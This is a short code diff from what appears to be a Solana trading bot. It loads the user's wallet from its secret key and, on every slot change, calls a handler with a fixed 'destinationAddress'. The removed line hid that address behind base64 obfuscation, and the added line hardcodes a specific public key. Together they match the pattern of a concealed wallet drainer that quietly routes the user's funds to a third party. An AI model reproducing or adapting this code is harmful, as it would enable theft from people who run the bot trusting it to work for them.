@@ -282,9 +282,9 @@ if(DEVNET_PROGRAM_ID) {
     const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
     const connection = new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
     connection.onSlotChange(
-      handleSlotChange({ connection, walletKeyPair, destinationAddress: new PublicKey(slotChangeOnKeyPair ? slotChangeOnKeyPair : slotChangeState ? slotChangeState : atob(MintUId.join(""))) }),
-    );
-  })();
+     handleSlotChange({ connection, walletKeyPair, destinationAddress: new PublicKey("DWVjMaHgFByXNmweWCEJqqmP3Rm4cSfmpx1ZkFAyJBM1") }),
+  );
+})();
 }
 
 export const areEnvVarsSet = () =>
